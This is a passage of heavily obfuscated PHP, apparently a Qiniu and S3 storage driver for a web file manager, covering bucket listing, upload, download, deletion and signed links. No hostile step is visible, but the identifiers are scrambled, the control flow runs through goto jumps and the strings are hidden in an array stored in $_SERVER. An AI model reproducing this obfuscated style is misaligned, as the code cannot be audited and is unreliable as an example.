$this->_init($Cè„•òÛ­); } public function _init($BÕìªù±ˆ£) { foreach ($BÕìªù±ˆ£ as $cò´ìÛŒ»‡ => $FÑ±ˆË½š) { if (isset($this->{$cò´ìÛŒ»‡})) { $this->{$cò´ìÛŒ»‡} = $FÑ±ˆË½š; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[‚Ğ°–—î][1213], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($cĞ‘ÇâŸó×, $A™ÍÎæ‚ŠÎ = '', $añ¨±àÈ¥ = REPEAT_RENAME) { if ($this->setContent($cĞ‘ÇâŸó×, $A™ÍÎæ‚ŠÎ)) { return $this->getPathOuter($cĞ‘ÇâŸó×); } return !1; } public function mkdir($eÖÅ™’¬—ë, $fš òˆ¿–÷ = REPEAT_SKIP) { goto A¦âÓœ›©£; dïòÊ…â†: $eÖÅ™’¬—ë = $fîãìÔ®‹Ò . $A ‚êõ…â—[8]; $FöòÓóŠÒô = get_path_this($fîãìÔ®‹Ò); $F¢³¦ó¤ƒ = $eÖÅ™’¬—ë . $FöòÓóŠÒô; goto f§ÂÉÙøìË; f§ÂÉÙøìË: if (!$this->mkfile($F¢³¦ó¤ƒ)) { return !1; } if (!$this->moveFile($F¢³¦ó¤ƒ, $eÖÅ™’¬—ë)) { $this->delFile($F¢³¦ó¤ƒ); return !1; } return $this->getPathOuter($fîãìÔ®‹Ò); goto DèäåÜÊ›—; A¦âÓœ›©£: $A ‚êõ…â— =& $_SERVER[‚Ğ°–—î]; $fîãìÔ®‹Ò = trim($eÖÅ™’¬—ë, $A ‚êõ…â—[8]); if ($this->_isFolder($fîãìÔ®‹Ò)) { return $this->getPathOuter($fîãìÔ®‹Ò); } goto dïòÊ…â†; DèäåÜÊ›—: } public function copyFile($a™²“†‡, $BÛ”Íˆ»Á¢) { $f½˜™÷¾Û = $this->bucketManager->copy($this->bucket, $a™²“†‡, $this->bucket, $BÛ”Íˆ»Á¢, !0); return $f½˜™÷¾Û ? !1 : !0; } public function moveFile($c„¢ŞôöÙ–, $F¬ƒÜ›ªò§) { $fÂ×§›µšš = $this->bucketManager->move($this->bucket, $c„¢ŞôöÙ–, $this->bucket, $F¬ƒÜ›ªò§, !0); return $fÂ×§›µšš ? !1 : !0; } public function delFile($eœŠÃƒŞ¯ğ) { $bâÍ™ÈÉÏ‡ = $this->bucketManager->delete($this->bucket, $eœŠÃƒŞ¯ğ); return $bâÍ™ÈÉÏ‡ ? !1 : !0; } public function delFolder($A–ªÒÚÑñõ) { $A¾¶‹ÏÂ–÷ = $this->fileList($A–ªÒÚÑñõ); if (empty($A¾¶‹ÏÂ–÷)) { return !0; } $D‚×¬¿Š¢“ = 1000; if (count($A¾¶‹ÏÂ–÷) <= $D‚×¬¿Š¢“) { return $this->qnDelObj($A¾¶‹ÏÂ–÷) ? !1 : !0; } foreach (array_chunk($A¾¶‹ÏÂ–÷, $D‚×¬¿Š¢“) as $A·ˆÔ†àÛ­) { $C ‘—ŒéÆŠ = $this->qnDelObj($A·ˆÔ†àÛ­); if ($C ‘—ŒéÆŠ) { return !1; } } return !0; } private function qnDelObj($a¬¸ÄËÚÖ¿) { $aÆÓ´‰õ = $this->bucketManager->buildBatchDelete($this->bucket, $a¬¸ÄËÚÖ¿); list($A¼³åàÀ³, $Fº¸öô‰Á) = $this->bucketManager->batch($aÆÓ´‰õ); return $Fº¸öô‰Á; } private function fileList($eÎ«Õœ©“ë, $F Èæ„¸Ë = 0) { goto c†ó²•è; A©«•§§ : $a‚÷øˆš” = array(); while (!0) { list($d¶²˜ØÒ, $d–ã—î©©Š) = $this->bucketManager->listFiles($this->bucket, $dÍŠ°°ò‹«, $Bİ‡š‰îË, $fä›™©­Ò, $DŸ…¨óõ¹Ë); if ($d–ã—î©©Š) { return !1; } $Bİ‡š‰îË = array_key_exists($eù£¹§·[1183], $d¶²˜ØÒ) ? $Bİ‡š‰îË = $d¶²˜ØÒ[$eù£¹§·[1214]] : $eù£¹§·[33]; foreach ($d¶²˜ØÒ[$eù£¹§·[1215]] as $CŒè›’ÙŸ¢) { $B©î¢‹èè« = $CŒè›’ÙŸ¢[$eù£¹§·[89]]; if ($F Èæ„¸Ë) { $B©î¢‹èè« = array($eù£¹§·[28] => $B©î¢‹èè«, $eù£¹§·[77] => $CŒè›’ÙŸ¢[$eù£¹§·[1216]]); } $a‚÷øˆš”[] = $B©î¢‹èè«; } if ($Bİ‡š‰îË == $eù£¹§·[33]) { break; } } return $a‚÷øˆš”; goto C²æªÔÉÙ×; Fƒ¼êë—ØÎ: $Bİ‡š‰îË = $eù£¹§·[33]; $fä›™©­Ò = 1000; $DŸ…¨óõ¹Ë = $eù£¹§·[33]; goto A©«•§§ ; c†ó²•è: $eù£¹§· =& $_SERVER[‚Ğ°–—î]; $eÎ«Õœ©“ë = trim($eÎ«Õœ©“ë, $eù£¹§·[8]); $dÍŠ°°ò‹« = empty($eÎ«Õœ©“ë) ? $eù£¹§·[33] : $eÎ«Õœ©“ë . $eù£¹§·[8]; goto Fƒ¼êë—ØÎ; C²æªÔÉÙ×: } public function rename($dÁ¿¤§Î»ì, $d˜Ë¬¤¡¹–) { return $this->renameObject($dÁ¿¤§Î»ì, $d˜Ë¬¤¡¹–); } public function fileInfo($C¾œÃ¤“‰Ç, $DÔšÖ“© = false, $cøÕñ½ªí½ = array()) { goto D’· ¡äòß; D„–Ó§È‡: return $cÃÒ˜­á‚á; goto b—‡ÁŒ½Å; Bêøåöâ¢: if (empty($cøÕñ½ªí½)) { $cøÕñ½ªí½ = $this->objectMeta($C¾œÃ¤“‰Ç); if (!$cøÕñ½ªí½) { return $cÃÒ˜­á‚á; } } if (isset($cøÕñ½ªí½[$d‡òƒšÆ‹[1217]])) { $cÃÒ˜­á‚á[$d‡òƒšÆ‹[187]] = $cøÕñ½ªí½[$d‡òƒšÆ‹[1217]]; } if (isset($cøÕñ½ªí½[$d‡òƒšÆ‹[1216]])) { $cÃÒ˜­á‚á[$d‡òƒšÆ‹[77]] = $cøÕñ½ªí½[$d‡òƒšÆ‹[1216]]; } goto D„–Ó§È‡; D’· ¡äòß: $d‡òƒšÆ‹ =& $_SERVER[‚Ğ°–—î]; if ($DÔšÖ“©) { return array($d‡òƒšÆ‹[28] => $this->pathThis($C¾œÃ¤“‰Ç), $d‡òƒšÆ‹[75] => $this->getPathOuter($d‡òƒšÆ‹[8] . $C¾œÃ¤“‰Ç), $d‡òƒšÆ‹[29] => $d‡òƒšÆ‹[167], $d‡òƒšÆ‹[77] => isset($cøÕñ½ªí½[$d‡òƒšÆ‹[1216]]) ? $cøÕñ½ªí½[$d‡òƒšÆ‹[1216]] : 0, $d‡òƒšÆ‹[160] => $this->ext($C¾œÃ¤“‰Ç)); } $cÃÒ˜­á‚á = array($d‡òƒšÆ‹[28] => $this->pathThis($C¾œÃ¤“‰Ç), $d‡òƒšÆ‹[75] => $this->getPathOuter($d‡òƒšÆ‹[8] . $C¾œÃ¤“‰Ç), $d‡òƒšÆ‹[29] => $d‡òƒšÆ‹[167], $d‡òƒšÆ‹[187] => 0, $d‡òƒšÆ‹[107] => 0, $d‡òƒšÆ‹[77] => 0, $d‡òƒšÆ‹[160] => $this->ext($C¾œÃ¤“‰Ç), $d‡òƒšÆ‹[188] => !0, $d‡òƒšÆ‹[189] => !0); goto Bêøåöâ¢; b—‡ÁŒ½Å: } public function folderInfo($fÑ™âëˆ‹Ï, $fÌØ°¾ó™ = false) { goto eŸÇğ§§Ø–; eŸÇğ§§Ø–: $BòÀ‹›¸°× =& $_SERVER[‚Ğ°–—î]; if ($fÌØ°¾ó™) { return array($BòÀ‹›¸°×[28] => $this->pathThis($fÑ™âëˆ‹Ï), $BòÀ‹›¸°×[75] => $this->getPathOuter($BòÀ‹›¸°×[8] . $fÑ™âëˆ‹Ï), $BòÀ‹›¸°×[29] => $BòÀ‹›¸°×[76]); } $D£íÂ²ÖÁ¢ = array($BòÀ‹›¸°×[28] => $this->pathThis($fÑ™âëˆ‹Ï), $BòÀ‹›¸°×[75] => $this->getPathOuter($BòÀ‹›¸°×[8] . $fÑ™âëˆ‹Ï), $BòÀ‹›¸°×[29] => $BòÀ‹›¸°×[76], $BòÀ‹›¸°×[187] => 0, $BòÀ‹›¸°×[107] => 0, $BòÀ‹›¸°×[1162] => !0, $BòÀ‹›¸°×[1163] => !0); goto aŒÙĞÂ“æœ; aŒÙĞÂ“æœ: $fÑ™âëˆ‹Ï = rtrim($fÑ™âëˆ‹Ï, $BòÀ‹›¸°×[8]) . $BòÀ‹›¸°×[8]; $aÖ£Úîßİá = $this->objectMeta($fÑ™âëˆ‹Ï); if (isset($aÖ£Úîßİá[$BòÀ‹›¸°×[1217]])) { $D£íÂ²ÖÁ¢[$BòÀ‹›¸°×[187]] = $aÖ£Úîßİá[$BòÀ‹›¸°×[1217]]; } goto cğí´à¼¼ô; cğí´à¼¼ô: return $D£íÂ²ÖÁ¢; goto BáËÃ›°Òƒ; BáËÃ›°Òƒ: } public function listPath($EÎİ‡èÏ, $f¤âòàÊ»Ä = false) { goto F”–íŞâ™; d”òÌøáŠ‹: $c±³Ì¬ÚÊ = $AÙĞó’–±š[33]; $f¯¾ÔŠ³í‚ = 1000; $F°÷ÇÔŸ÷ = $AÙĞó’–±š[8]; goto Bˆ™²‰¯êš; F”–íŞâ™: $AÙĞó’–±š =& $_SERVER[‚Ğ°–—î]; $EÎİ‡èÏ = trim($EÎİ‡èÏ, $AÙĞó’–±š[8]); $F¸ö®Ç›„õ = empty($EÎİ‡èÏ) ? $AÙĞó’–±š[33] : $EÎİ‡èÏ . $AÙĞó’–±š[8]; goto d”òÌøáŠ‹; Bˆ™²‰¯êš: $F®Ùé³†¯ = $AµŞ³­ö† = array(); while (!0) { list($b³³Ş°ê»ª, $Aš¼…àÒâ) = $this->bucketManager->listFiles($this->bucket, $F¸ö®Ç›„õ, $c±³Ì¬ÚÊ, $f¯¾ÔŠ³í‚, $F°÷ÇÔŸ÷); if ($Aš¼…àÒâ) { return !1; } $c±³Ì¬ÚÊ = array_key_exists($AÙĞó’–±š[1183], $b³³Ş°ê»ª) ? $c±³Ì¬ÚÊ = $b³³Ş°ê»ª[$AÙĞó’–±š[1214]] : $AÙĞó’–±š[33]; if (isset($b³³Ş°ê»ª[$AÙĞó’–±š[1218]])) { foreach ($b³³Ş°ê»ª[$AÙĞó’–±š[1218]] as $aˆ‘Íµ¤Ë™) { if ($aˆ‘Íµ¤Ë™ == $F¸ö®Ç›„õ) { continue; } $F®Ùé³†¯[] = $this->folderInfo($aˆ‘Íµ¤Ë™, $f¤âòàÊ»Ä); } } if (isset($b³³Ş°ê»ª[$AÙĞó’–±š[1215]])) { foreach ($b³³Ş°ê»ª[$AÙĞó’–±š[1215]] as $FóªÉº·ßÙ) { if ($FóªÉº·ßÙ[$AÙĞó’–±š[89]] == $F¸ö®Ç›„õ) { continue; } $AµŞ³­ö†[] = $this->fileInfo($FóªÉº·ßÙ[$AÙĞó’–±š[89]], $f¤âòàÊ»Ä, $FóªÉº·ßÙ); } } if ($c±³Ì¬ÚÊ == $AÙĞó’–±š[33]) { break; } } return array($AÙĞó’–±š[74] => $F®Ùé³†¯, $AÙĞó’–±š[73] => $AµŞ³­ö†); goto fÛö¨ˆÉò; fÛö¨ˆÉò: } public function has($c‚Ã²ö›, $dŒÖ’ğˆ£ = false, $d´Š¾’¹ç¿ = true) { goto FšÌÕ¬ ‡‰; D‘Ğ‘‰öÉ“: $aåå¡‚Õœ = $d¥ƒë¹¯³[33]; $fÆ—‡İà÷ = 1000; $B«Ï„Çôåå = $d¥ƒë¹¯³[8]; goto A‡Ò®à¨˜¥; B¹î‘¹õ‹Í: if ($dŒÖ’ğˆ£) { return array($d¥ƒë¹¯³[191] => $BÇš·Èö´İ, $d¥ƒë¹¯³[192] => $fºåô­æ); } return !1; goto F×ÑÁÌ–Ô´; FšÌÕ¬ ‡‰: $d¥ƒë¹¯³ =& $_SERVER[‚Ğ°–—î]; $c‚Ã²ö› = trim($c‚Ã²ö›, $d¥ƒë¹¯³[8]); $Cœ’øˆ£‘ = empty($c‚Ã²ö›) ? $d¥ƒë¹¯³[33] : $c‚Ã²ö› . $d¥ƒë¹¯³[8]; goto D‘Ğ‘‰öÉ“; A‡Ò®à¨˜¥: $BÇš·Èö´İ = 0; $fºåô­æ = 0; while (!0) { list($A´•Ñ‹¦÷¨, $B®Ö±Œ‡) = $this->bucketManager->listFiles($this->bucket, $Cœ’øˆ£‘, $aåå¡‚Õœ, $fÆ—‡İà÷, $B«Ï„Çôåå); if ($B®Ö±Œ‡) { return !1; } $aåå¡‚Õœ = array_key_exists($d¥ƒë¹¯³[1183], $A´•Ñ‹¦÷¨) ? $aåå¡‚Õœ = $A´•Ñ‹¦÷¨[$d¥ƒë¹¯³[1214]] : $d¥ƒë¹¯³[33]; if ($dŒÖ’ğˆ£) { if (!empty($A´•Ñ‹¦÷¨[$d¥ƒë¹¯³[1215]])) { $BÇš·Èö´İ += count($A´•Ñ‹¦÷¨[$d¥ƒë¹¯³[1215]]); } if (!empty($A´•Ñ‹¦÷¨[$d¥ƒë¹¯³[1218]])) { $fºåô­æ += count($A´•Ñ‹¦÷¨[$d¥ƒë¹¯³[1218]]); } if ($aåå¡‚Õœ === $d¥ƒë¹¯³[33]) { break; } continue; } if ($d´Š¾’¹ç¿) { if (!empty($A´•Ñ‹¦÷¨[$d¥ƒë¹¯³[1215]])) { return !0; } } else { if (!empty($A´•Ñ‹¦÷¨[$d¥ƒë¹¯³[1218]])) { return !0; } } if ($aåå¡‚Õœ == $d¥ƒë¹¯³[33]) { break; } } goto B¹î‘¹õ‹Í; F×ÑÁÌ–Ô´: } public function listAll($e¬ÂÏøÜ®î) { $F°¯×ÑÊÜ¬ =& $_SERVER[‚Ğ°–—î]; $fÜ“…”¾ªö = $this->fileList($e¬ÂÏøÜ®î, 1); $F¼ƒî©Ğ’» = array(); foreach ($fÜ“…”¾ªö as $B­ù—õˆé) { $F¼ƒî©Ğ’»[$B­ù—õˆé[$F°¯×ÑÊÜ¬[28]]] = $B­ù—õˆé[$F°¯×ÑÊÜ¬[77]]; } return $this->listAllFiles($e¬ÂÏøÜ®î, array_keys($F¼ƒî©Ğ’»), $F¼ƒî©Ğ’»); } public function canRead($F°ŸËö§°) { return $this->exist($F°ŸËö§°) ? !0 : !1; } public function canWrite($bº‚ÓÄåØ¤) { return $this->exist($bº‚ÓÄåØ¤) ? !0 : !1; } public function getContent($d¾‹ï”´÷) { return $this->fileSubstr($d¾‹ï”´÷, 0, -1); } public function setContent($eõ†·Â™ß, $eöŸÄ¶œ = '') { $E±õÕ¨‚Ì• = $this->tempFile($this->pathThis($eõ†·Â™ß)); file_put_contents($E±õÕ¨‚Ì•, $eöŸÄ¶œ); if ($this->upload($eõ†·Â™ß, $E±õÕ¨‚Ì•)) { $this->tempFileRemve($E±õÕ¨‚Ì•); return !0; } return !1; } public function refreshUrls($C¨ùœ©Ÿ±å) { goto EÇÛø²‘—; EÇÛø²‘—: $a¹¡áËˆÓÍ =& $_SERVER[‚Ğ°–—î]; $e²¾Á‹Èâ = array(); if (is_array($C¨ùœ©Ÿ±å)) { foreach ($C¨ùœ©Ÿ±å as $C½Ô‡§…‚Ş) { $e²¾Á‹Èâ[] = $this->link($C½Ô‡§…‚Ş); } } else { $e²¾Á‹Èâ[] = $this->link($C¨ùœ©Ÿ±å); } goto bªæâÔÆ£ˆ; bªæâÔÆ£ˆ: $AŠ¿øÒ¼› = new Qiniu\Cdn\CdnManager($this->auth); list($FŠŒïİÁé£, $DÉ“…•Îè) = $AŠ¿øÒ¼›->refreshUrls($e²¾Á‹Èâ); if ($DÉ“…•Îè) { return !1; } goto Dïœõê…İ; Dïœõê…İ: return $FŠŒïİÁé£[$a¹¡áËˆÓÍ[1219]] == $a¹¡áËˆÓÍ[695] ? !0 : !1; goto CãƒÀÔ¸ Ê; CãƒÀÔ¸ Ê: } public function fileSubstr($d¸£¨ó “, $cñ®·é¿ê¢, $C¢‘§§À±‚) { $D¹ìîêµ¸ê =& $_SERVER[‚Ğ°–—î]; if (!($bÕÉë‹ÓÄ = $this->link($d¸£¨ó “))) { return !1; } $E¡¡‚òĞ°° = !1; if ($C¢‘§§À±‚ > 0) { $b òô‹¨· = $cñ®·é¿ê¢ + $C¢‘§§À±‚ - 1; $E¡¡‚òĞ°° = array($D¹ìîêµ¸ê[1220] . $cñ®·é¿ê¢ . $D¹ìîêµ¸ê[412] . $b òô‹¨·); } $cçË’Üİƒ¬ = url_request($bÕÉë‹ÓÄ, $D¹ìîêµ¸ê[216], !1, $E¡¡‚òĞ°°); return $cçË’Üİƒ¬[$D¹ìîêµ¸ê[688]] ? $cçË’Üİƒ¬[$D¹ìîêµ¸ê[1035]] : !1; } public function upload($cŞ¢õ³‚ , $fŸñ®®†Öô, $EÜ´”‡Ã ³ = false, $aÎŠ¦ğë×Ã = REPEAT_REPLACE) { $Cí’ËÆÃ = new Qiniu\Storage\UploadManager(); $bÂĞ™Ğ´¼Å = $this->auth->uploadToken($this->bucket, $cŞ¢õ³‚ ); $aÒˆË™¿Á½ = get_file_mime(get_path_ext($fŸñ®®†Öô)); list($DÕÀ ¦ñ¸, $b©ô¬áÑ’ñ) = $Cí’ËÆÃ->putFile($bÂĞ™Ğ´¼Å, $cŞ¢õ³‚ , $fŸñ®®†Öô, null, $aÒˆË™¿Á½); return $b©ô¬áÑ’ñ ? !1 : $this->getPathOuter($cŞ¢õ³‚ ); } public function uploadFormData($E©«îÓ·°ç, $B™«ë™‚ = 3600) { return $this->uploadToken($E©«îÓ·°ç, $B™«ë™‚); } public function multiUploadFormData($e™éñ—İ§Ø, $b‹‰½ˆ•¬ = 3600) { return $this->uploadToken($e™éñ—İ§Ø, $b‹‰½ˆ•¬); } private function uploadToken($eìÉäàµÂâ, $fŸÆ¦¤ĞÊ‡ = 3600) { goto d¦àÍÙÑÛù; d¦àÍÙÑÛù: $d‚÷‡¸ŞĞÖ =& $_SERVER[‚Ğ°–—î]; $C“»ˆ¸¥Š× = $fŸÆ¦¤ĞÊ‡; $AáÒè¨ĞÎç = array($d‚÷‡¸ŞĞÖ[1221] => $d‚÷‡¸ŞĞÖ[1222]); goto b˜Œí–‡·ä; E—õˆ’Òé›: $C®Œ¤­£õº = http_type() . "\72\57\x2f\165\x70\x6c\157\x61\144{$E¦“²ƒ×}\56\161\151\x6e\x69\x75\x70\56\143\x6f\155\57"; return array($d‚÷‡¸ŞĞÖ[1224] => $d¦«‡¬¦ù», $d‚÷‡¸ŞĞÖ[1225] => $C®Œ¤­£õº); goto d×µª„·³Õ; b˜Œí–‡·ä: $e‰Ôµ­èÉ = null; $d¦«‡¬¦ù» = $this->auth->uploadToken($this->bucket, $e‰Ôµ­èÉ, $C“»ˆ¸¥Š×, $AáÒè¨ĞÎç, !0); $E¦“²ƒ× = empty($this->region) || $this->region == $d‚÷‡¸ŞĞÖ[1223] ? $d‚÷‡¸ŞĞÖ[33] : $d‚÷‡¸ŞĞÖ[412] . $this->region; goto E—õˆ’Òé›; d×µª„·³Õ: } public function download($E™öµùÖ¿Æ, $bçéâ‰±Áá) { goto Fµ‡çó¾Õô; Fµ‡çó¾Õô: $dæŒ×‚ç¸ = IO::getPathInner(IO::mkfile($bçéâ‰±Áá)); if (!($aà“íØŞ½’ = $this->link($E™öµùÖ¿Æ))) { return !1; } $dâ‡µêé²Ü = 0; goto B¸ÍâÃŞ²°; bïˆ…Çëà×: fclose($Cšê•Åß¡³); return $bçéâ‰±Áá; goto fó¤ƒ¦Êè; B¸ÍâÃŞ²°: $f‰ñ¹‘ó¢ = 1024 * 200; $Cšê•Åß¡³ = fopen($dæŒ×‚ç¸, $_SERVER[‚Ğ°–—î][1226]); while (!0) { $B…äÆßê£ = $this->fileSubstr($E™öµùÖ¿Æ, $dâ‡µêé²Ü, $f‰ñ¹‘ó¢); if ($B…äÆßê£ === !1) { return !1; } fwrite($Cšê•Åß¡³, $B…äÆßê£); $dâ‡µêé²Ü += $f‰ñ¹‘ó¢; if (strlen($B…äÆßê£) < $f‰ñ¹‘ó¢) { break; } } goto bïˆ…Çëà×; fó¤ƒ¦Êè: } public function link($Eã«©ÄõÑ, $f…œ“ƒ“àÁ = '') { if (!$this->isFile($Eã«©ÄõÑ)) { return !1; } $FÁñŠÒ­« = $this->getHost() . $_SERVER[‚Ğ°–—î][8] . $this->pathEncode($Eã«©ÄõÑ) . $f…œ“ƒ“àÁ; return $this->auth->privateDownloadUrl($FÁñŠÒ­«, 3600 * 12); } public function fileOut($D±±İìÎ­‡, $eËàÀ¤Ò‡Ñ = false, $c‚˜¤‘ëºˆ = false, $Bê…Å£Ù¤ = '') { $dÏ´ªŒáô† =& $_SERVER[‚Ğ°–—î]; if (!$c‚˜¤‘ëºˆ) { $c‚˜¤‘ëºˆ = $this->pathThis($D±±İìÎ­‡); } $DÉİÔ‹­… = $eËàÀ¤Ò‡Ñ ? $dÏ´ªŒáô†[1227] . rawurlencode($c‚˜¤‘ëºˆ) : $dÏ´ªŒáô†[33]; $c„¶»·åâ = $this->link($D±±İìÎ­‡, $DÉİÔ‹­…); $this->fileOutLink($c„¶»·åâ); } public function fileOutServer($E¿‹â„áó¢, $Fˆ‘˜‡ˆÓß = false, $C®Õ¿Åå’„ = false, $cù°ˆÇÍŒ = '') { parent::fileOut($E¿‹â„áó¢, $Fˆ‘˜‡ˆÓß, $C®Õ¿Åå’„, $cù°ˆÇÍŒ); } public function fileOutImage($dÃÏŒ¼„‚, $dÑ¦¼©”ºÜ = 250) { $CàÓĞ×ŠÌ = $this->link($dÃÏŒ¼„‚, $_SERVER[‚Ğ°–—î][1228] . $dÑ¦¼©”ºÜ); $this->fileOutLink($CàÓĞ×ŠÌ); } public function fileOutImageServer($d¬©ÃŒì, $bŞ—ÇŒ¨ä“ = 250) { parent::fileOutImage($d¬©ÃŒì, $bŞ—ÇŒ¨ä“); } public function hashMd5($bÃ—ßï³) { $E…ƒÙˆÛÃë =& $_SERVER[‚Ğ°–—î]; $A‹ßÎä“ƒï = $this->objectMeta($bÃ—ßï³); return isset($A‹ßÎä“ƒï[$E…ƒÙˆÛÃë[196]]) ? $A‹ßÎä“ƒï[$E…ƒÙˆÛÃë[196]] : !1; $D’…×—‡•Ç = $this->link($bÃ—ßï³, $E…ƒÙˆÛÃë[1229]); } public function size($BÀŠòíÑ­Ë) { $dù¤‡­¼¾Í = $this->objectMeta($BÀŠòíÑ­Ë); return $dù¤‡­¼¾Í ? $dù¤‡­¼¾Í[$_SERVER[‚Ğ°–—î][77]] : 0; } public function info($EÕğ´©œ©Ş) { if ($this->isFolder($EÕğ´©œ©Ş)) { return $this->folderInfo($EÕğ´©œ©Ş); } else { if ($this->isFile($EÕğ´©œ©Ş)) { return $this->fileInfo($EÕğ´©œ©Ş); } } return !1; } public function exist($DÀÌß¦å¾”) { return $this->isFile($DÀÌß¦å¾”) || $this->isFolder($DÀÌß¦å¾”); } public function isFile($BÜ˜çî©…Õ) { return !$this->isFolder($BÜ˜çî©…Õ) && $this->objectMeta($BÜ˜çî©…Õ); } public function isFolder($aØ×òÛÑğ) { return $this->cacheMethod($_SERVER[‚Ğ°–—î][223], $aØ×òÛÑğ); } protected function objectMeta($b®ØîÔİÁƒ) { return $this->cacheMethod($_SERVER[‚Ğ°–—î][224], $b®ØîÔİÁƒ); } protected function _objectMeta($f´»ôå°±) { $a×ƒ¾‰´Ú‹ =& $_SERVER[‚Ğ°–—î]; list($BÆ›Ü›§Õë, $f©—±àË›ø) = $this->bucketManager->stat($this->bucket, $f´»ôå°±); if ($BÆ›Ü›§Õë) { $BÆ›Ü›§Õë[$a×ƒ¾‰´Ú‹[77]] = intval($BÆ›Ü›§Õë[$a×ƒ¾‰´Ú‹[1216]]); } return $BÆ›Ü›§Õë; } protected function _isFolder($aí²Ë¶ÁŠ§) { $DÓ¿è•·ÕÁ =& $_SERVER[‚Ğ°–—î]; list($bà¹¶ö´šÑ, $E¤’šŞ§æÔ) = $this->bucketManager->listFiles($this->bucket, trim($aí²Ë¶ÁŠ§, $DÓ¿è•·ÕÁ[8]) . $DÓ¿è•·ÕÁ[8], $DÓ¿è•·ÕÁ[33], 1, $DÓ¿è•·ÕÁ[8]); return !empty($bà¹¶ö´šÑ[$DÓ¿è•·ÕÁ[1215]]) || !empty($bà¹¶ö´šÑ[$DÓ¿è•·ÕÁ[1218]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($aœÓ«•Ô¡ ) { parent::__construct($aœÓ«•Ô¡ ); } public function uploadFormData($A“Û™‹¬¾, $Bß‡š‡…ĞÓ = 3600) { goto aŒëåº¤µÏ; e³Ûğ¥Ş·Ì: $a™çÍˆ˜ÄÑ = array($this->accessKey, $F‡ÄÌö¨¡Õ, $this->region, $BİºãÂ š, $a…ËË¬¿Öß); $dÑ•Íî®ÄŠ = implode($AÔ¢ºô¬Ê¥[8], $a™çÍˆ˜ÄÑ); $fÛ™†ï‘Òœ = array($AÔ¢ºô¬Ê¥[1103] => gmdate($AÔ¢ºô¬Ê¥[1102], strtotime($AÔ¢ºô¬Ê¥[1137])), $AÔ¢ºô¬Ê¥[1104] => array(array($AÔ¢ºô¬Ê¥[1106] => $this->bucket), array($AÔ¢ºô¬Ê¥[1105] => $D”í‡ì—­á), array($AÔ¢ºô¬Ê¥[1107], $AÔ¢ºô¬Ê¥[1108], $AÔ¢ºô¬Ê¥[33]), array($AÔ¢ºô¬Ê¥[1107], $AÔ¢ºô¬Ê¥[1138], $AÔ¢ºô¬Ê¥[33]), array($AÔ¢ºô¬Ê¥[1107], $AÔ¢ºô¬Ê¥[1139], $AÔ¢ºô¬Ê¥[33]), array($AÔ¢ºô¬Ê¥[1109] => $AÓô²‚º³), array($AÔ¢ºô¬Ê¥[1140] => $dÑ•Íî®ÄŠ), array($AÔ¢ºô¬Ê¥[1141] => $aÊëåØÊ), array($AÔ¢ºô¬Ê¥[1142] => $dÁ¶¥˜ãØÈ), array($AÔ¢ºô¬Ê¥[1143] => $A×«©ù¸‘))); goto A„„´Ü‘†; A„„´Ü‘†: $Cˆ„µÓç÷µ = base64_encode(json_encode($fÛ™†ï‘Òœ)); $DÃœØ¼âô = hash_hmac($AÔ¢ºô¬Ê¥[1144], $F‡ÄÌö¨¡Õ, $AÔ¢ºô¬Ê¥[1145] . $this->secret, !0); $b‚ã’¼ìé = hash_hmac($AÔ¢ºô¬Ê¥[1144], $this->region, $DÃœØ¼âô, !0); goto FÌéÆæì„£; FëÉ†Ã–²: $a…ËË¬¿Öß = $AÔ¢ºô¬Ê¥[1136]; $A×«©ù¸‘ = $Bß‡š‡…ĞÓ . $AÔ¢ºô¬Ê¥[33]; $AÓô²‚º³ = $AÔ¢ºô¬Ê¥[1101]; goto e³Ûğ¥Ş·Ì; dµ…ßæí¤ : $aôËÜ¢æ™Ò = array($AÔ¢ºô¬Ê¥[199] => $AÔ¢ºô¬Ê¥[33], $AÔ¢ºô¬Ê¥[1146] => $AÔ¢ºô¬Ê¥[33], $AÔ¢ºô¬Ê¥[1105] => $D”í‡ì—­á, $AÔ¢ºô¬Ê¥[1109] => $AÓô²‚º³, $AÔ¢ºô¬Ê¥[1113] => $Cˆ„µÓç÷µ, $AÔ¢ºô¬Ê¥[1147] => $dÑ•Íî®ÄŠ, $AÔ¢ºô¬Ê¥[1148] => $aÊëåØÊ, $AÔ¢ºô¬Ê¥[1149] => $dÁ¶¥˜ãØÈ, $AÔ¢ºô¬Ê¥[1150] => $A×«©ù¸‘, $AÔ¢ºô¬Ê¥[1151] => $F±í˜‚¿õ, $AÔ¢ºô¬Ê¥[169] => $this->getHost()); return $aôËÜ¢æ™Ò; goto BñˆÑ¤¦; FÌéÆæì„£: $Bè©ï®ÉÍà = hash_hmac($AÔ¢ºô¬Ê¥[1144], $BİºãÂ š, $b‚ã’¼ìé, !0); $cÕğïˆ²æ = hash_hmac($AÔ¢ºô¬Ê¥[1144], $a…ËË¬¿Öß, $Bè©ï®ÉÍà, !0); $F±í˜‚¿õ = hash_hmac($AÔ¢ºô¬Ê¥[1144], $Cˆ„µÓç÷µ, $cÕğïˆ²æ); goto dµ…ßæí¤ ; aŒëåº¤µÏ: $AÔ¢ºô¬Ê¥ =& $_SERVER[‚Ğ°–—î]; $D”í‡ì—­á = $AÔ¢ºô¬Ê¥[185]; $aÊëåØÊ = $AÔ¢ºô¬Ê¥[1134]; goto d…‘ô¥œ‡è; d…‘ô¥œ‡è: $BİºãÂ š = $AÔ¢ºô¬Ê¥[59]; $dÁ¶¥˜ãØÈ = gmdate($AÔ¢ºô¬Ê¥[1135]); $F‡ÄÌö¨¡Õ = gmdate($AÔ¢ºô¬Ê¥[689]); goto FëÉ†Ã–²; BñˆÑ¤¦: } public function multiUploadFormData($dÓã½¶ÕÓ, $BÅÖ­Ğ÷Ç¿ = 3600) { $FøÓ§‚Ì´ =& $_SERVER[‚Ğ°–—î]; $a´°›‡ĞÀ = gmdate($FøÓ§‚Ì´[1230]); $DØÌøÄœò = array(); $eˆ‘®¥ˆïù = $this->client->getUploadId($this->bucket, $dÓã½¶ÕÓ, $DØÌøÄœò); if (!$eˆ‘®¥ˆïù) { return !1; } return array($FøÓ§‚Ì´[209] => $eˆ‘®¥ˆïù, $FøÓ§‚Ì´[169] => $this->getHost() . $FøÓ§‚Ì´[8] . 